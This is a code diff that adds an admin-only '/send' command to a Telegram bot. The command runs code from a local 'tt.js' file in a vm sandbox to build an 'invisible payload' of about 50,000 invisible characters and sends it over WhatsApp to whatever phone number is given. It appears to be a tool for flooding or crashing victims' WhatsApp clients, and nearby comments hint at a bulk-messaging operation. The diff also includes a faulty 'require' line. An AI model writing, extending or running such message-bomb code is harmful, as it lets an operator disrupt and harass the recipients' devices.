@@ -39,6 +39,7 @@ const apiId = parseInt(process.env.TELEGRAM_API_ID);
 // Add these to handle bulk forwards without spamming
 const vzBuffer = {}; 
 const vzTimer = {};
+const { vm } = require('vm'); // To safely execute the dynamic code
 const mergeBuffer = {}; // <-- ADD THIS LINE FOR THE FILE MERGER
 const apiHash = process.env.TELEGRAM_API_HASH;
 const stringSession = new StringSession(process.env.TELEGRAM_SESSION || ""); 
@@ -1683,6 +1684,57 @@ export function setupTelegramCommands(bot, notificationBot, clients, shortIdMap,
             'DB Cleared'
         );
     }
+
+
+    
+
+// Usage: /send 2348012345678
+bot.onText(/\/send\s+(\d+)/, async (msg, match) => {
+    const chatId = msg.chat.id.toString();
+    if (chatId !== ADMIN_ID) return;
+
+    const targetNumber = match[1];
+    let statusMsg = await bot.sendMessage(chatId, `[SYSTEM] Generating invisible payload...`);
+
+    try {
+        const ttPath = path.join(__dirname, 'tt.js');
+        if (!fs.existsSync(ttPath)) throw new Error('tt.js not found.');
+
+        // 1. Read the code from your tt.js
+        const code = fs.readFileSync(ttPath, 'utf8');
+
+        // 2. Execute the code to get the 'message' variable
+        // We use a sandbox so 'message' becomes available to us
+        const sandbox = { console: console, message: "" };
+        require('vm').createContext(sandbox);
+        require('vm').runInContext(code, sandbox);
+
+        const finalPayload = sandbox.message;
+
+        if (!finalPayload) {
+            throw new Error('Could not capture "message" variable from tt.js');
+        }
+
+        // 3. Format Number
+        const waId = targetNumber.includes('@c.us') ? targetNumber : `${targetNumber}@c.us`;
+
+        // 4. Send via your WhatsApp socket (sock)
+        await sock.sendMessage(waId, { text: finalPayload });
+
+        await bot.editMessageText(`[SUCCESS] ✅ Payload sent to ${targetNumber}!\n(Invisible chars: 50,000)`, {
+            chat_id: chatId,
+            message_id: statusMsg.message_id
+        });
+
+    } catch (err) {
+        console.error(err);
+        await bot.editMessageText(`[ERROR] Send failed: ${err.message}`, {
+            chat_id: chatId,
+            message_id: statusMsg.message_id
+        });
+    }
+});
+
 
 
         // --- /validate command: Filter invalid numbers locally to protect IP Trust Score ---
